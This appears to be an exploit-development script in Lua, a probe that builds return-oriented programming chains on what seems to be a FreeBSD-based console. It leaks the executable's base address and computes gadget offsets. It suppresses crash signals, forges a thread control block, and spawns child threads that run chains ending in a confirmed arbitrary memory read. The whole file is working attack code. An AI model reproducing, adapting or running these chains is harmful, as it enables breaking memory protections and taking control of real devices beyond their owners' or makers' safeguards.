-- CRASH_CLASS: MODERATE
-- PROBE 1199k: Child thread ROP — replicate 384b confirmed pattern (v8)
--
-- v2-v7 all failed because the chain lacked sysarch+thr_exit.
-- v8: exact 384b pattern — SIG_IGN safety net, memory.alloc stack,
--   bare_ret start_func, sysarch(SET_FSBASE) first, then marker writes,
--   then thr_exit(431). Child exits CLEANLY.

print("=== PROBE 1199k: 384b pattern replication (v8) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

-- fn_addr stub
local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets (from 384b — confirmed offsets)
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67  -- mov [rdi],rax;ret

-- Ignore SIGSEGV + SIGSYS (exact 384b pattern)
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
print("SIG_IGN installed for SIGSEGV+SIGSYS")

-- Fake TCB (exact 384b pattern)
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- Shared marker slots
local shared = memory.alloc(0x100)
local sha = N(shared)
for i = 0, 0xFC, 4 do wd(sha + i, 0xAAAAAAAA) end

-- =============================================
-- TEST A: sysarch + 3 markers + thr_exit
-- =============================================
print("")
print("[A] sysarch + markers + thr_exit")

-- Stack (memory.alloc, not mmap — exact 384b pattern)
local stk = memory.alloc(0x4000)
local sb = N(stk)
local ss = 0x2000
local rsp = sb + ss - ((sb + ss) % 16) - 8

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- Phase 0: sysarch(SET_FSBASE=129, &tcb_addr) — set up TLS
emit(g_pop_rdi);    emit(uint64(129))
emit(g_pop_rsi);    emit(uint64(N(fs_ptr)))
emit(g_pop_rax);    emit(uint64(165))
emit(stub)

-- Phase 1: save sysarch result to shared+0x00
emit(g_pop_rdi);    emit(uint64(sha))
emit(g_mov_m_rax)

-- Phase 2: marker 1 → shared+0x08
emit(g_pop_rdi);    emit(uint64(sha + 8))
emit(g_pop_rax);    emit(uint64(0xCAFE0001))
emit(g_mov_m_rax)

-- Phase 3: marker 2 → shared+0x10
emit(g_pop_rdi);    emit(uint64(sha + 0x10))
emit(g_pop_rax);    emit(uint64(0xCAFE0002))
emit(g_mov_m_rax)

-- Phase 4: marker 3 → shared+0x18
emit(g_pop_rdi);    emit(uint64(sha + 0x18))
emit(g_pop_rax);    emit(uint64(0xCAFE0003))
emit(g_mov_m_rax)

-- Phase 5: thr_exit(0) — clean exit
emit(g_pop_rdi);    emit(uint64(0))
emit(g_pop_rax);    emit(uint64(431))
emit(stub)

print(string.format("  %d qwords (%d bytes) at rsp=0x%X", off / 8, off, rsp))

-- thr_param (exact 384b pattern)
local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa, g_bare_ret)
wq(pa + 8, uint64(0))           -- arg (don't care, rdi overridden by pop_rdi)
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), uint64(0))
wq(pa + 0x30, tid_buf)

print("Launching child...")
local ok_t, rv_t = pcall(function() return mk(455)(uint64(pa), uint64(0x38)) end)
print("thr_new ret=" .. (ok_t and tostring(N(rv_t)) or "FAIL"))

-- Busy-wait (exact 384b pattern — no nanosleep)
for w = 1, 25000 do local _ = rd(sb) end
print("wait done")

if not alive() then print("DEAD"); return end
print("ALIVE after child!")

-- =============================================
-- Read markers
-- =============================================
print("")
print("[B] results")

local sa_raw = rq(sha)
local sa_h, sa_l = get_hi_lo(sa_raw)
local sa_v = sa_l
if sa_h == 0xFFFFFFFF then sa_v = -1 end
print(string.format("  sysarch result: %s (val=%d, expect 0)", fmt(sa_raw), sa_v))

local m1 = rd(sha + 8) or 0
local m2 = rd(sha + 0x10) or 0
local m3 = rd(sha + 0x18) or 0
print(string.format("  marker1: 0x%X (expect 0xCAFE0001)", m1))
print(string.format("  marker2: 0x%X (expect 0xCAFE0002)", m2))
print(string.format("  marker3: 0x%X (expect 0xCAFE0003)", m3))

if m1 == 0xCAFE0001 and m2 == 0xCAFE0002 and m3 == 0xCAFE0003 then
    print("")
    print("*** ALL 3 MARKERS PASS — ROP chain WORKS from child thread ***")
    if sa_v == 0 then
        print("*** sysarch(SET_FSBASE) SUCCEEDED — TLS active ***")
        print("*** thr_exit(431) CLEAN — full thread lifecycle ***")
    else
        print("*** sysarch returned " .. sa_v .. " but chain still worked ***")
    end
elseif m1 == 0xAAAAAAAA then
    print("")
    print("** FAIL: sentinels UNCHANGED — chain never executed **")
    print("** RSP mismatch? Check stack_size/stack_base **")
else
    print("")
    print(string.format("** PARTIAL: m1=0x%X m2=0x%X m3=0x%X **", m1, m2, m3))
end

-- =============================================
-- TEST C: If markers passed, test mmap read via chain
-- =============================================
if m1 == 0xCAFE0001 then
    print("")
    print("[C] mmap read gadget test")

    local sc_mmap = mk(477)
    local source = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local src_a = N(source)
    wq(src_a, uint64(0x1234567890ABCDEF))

    local res = memory.alloc(8)
    wq(N(res), uint64(0xBAD0BAD0))

    local g_mov_rax_rax = eb + 0x1EEBB  -- mov rax,[rax];ret

    local stk2 = memory.alloc(0x4000)
    local sb2 = N(stk2)
    local ss2 = 0x2000
    local rsp2 = sb2 + ss2 - ((sb2 + ss2) % 16) - 8

    local off2 = 0
    local function emit2(v) wq(rsp2 + off2, v); off2 = off2 + 8 end

    -- sysarch first
    emit2(g_pop_rdi);   emit2(uint64(129))
    emit2(g_pop_rsi);   emit2(uint64(N(fs_ptr)))
    emit2(g_pop_rax);   emit2(uint64(165))
    emit2(stub)

    -- read: rax = &source → rax = *source
    emit2(g_pop_rax);   emit2(uint64(src_a))
    emit2(g_mov_rax_rax)
    -- store to result
    emit2(g_pop_rdi);   emit2(uint64(N(res)))
    emit2(g_mov_m_rax)
    -- done marker
    emit2(g_pop_rdi);   emit2(uint64(sha + 0x20))
    emit2(g_pop_rax);   emit2(uint64(0xBEEF))
    emit2(g_mov_m_rax)
    -- thr_exit
    emit2(g_pop_rdi);   emit2(uint64(0))
    emit2(g_pop_rax);   emit2(uint64(431))
    emit2(stub)

    local par2 = memory.alloc(0x40)
    local pa2 = N(par2)
    for i = 0, 0x3C, 4 do wd(pa2 + i, 0) end
    wq(pa2, g_bare_ret)
    wq(pa2 + 8, uint64(0))
    wq(pa2 + 0x10, uint64(sb2))
    wq(pa2 + 0x18, uint64(ss2))
    local tid2 = memory.alloc(8); wq(N(tid2), uint64(0))
    wq(pa2 + 0x30, tid2)

    print("  spawning read child...")
    local ok2, rv2 = pcall(function() return mk(455)(uint64(pa2), uint64(0x38)) end)
    print("  thr_new ret=" .. (ok2 and tostring(N(rv2)) or "FAIL"))

    for w = 1, 25000 do local _ = rd(sb2) end

    if not alive() then print("  DEAD"); return end

    local done = rd(sha + 0x20) or 0
    local read_raw = rq(N(res))
    print(string.format("  done: 0x%X (expect 0xBEEF)", done))
    print(string.format("  read result: %s (expect 0x1234567890ABCDEF)", fmt(read_raw)))

    local rh, rl = get_hi_lo(read_raw)
    if done == 0xBEEF and rl == 0x90ABCDEF then
        print("  *** READ GADGET WORKS — arbitrary memory read from child ***")
    elseif done == 0xBEEF then
        print(string.format("  chain completed but read mismatch: %s", fmt(read_raw)))
    else
        print("  chain did not complete")
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 1199k COMPLETE ===")
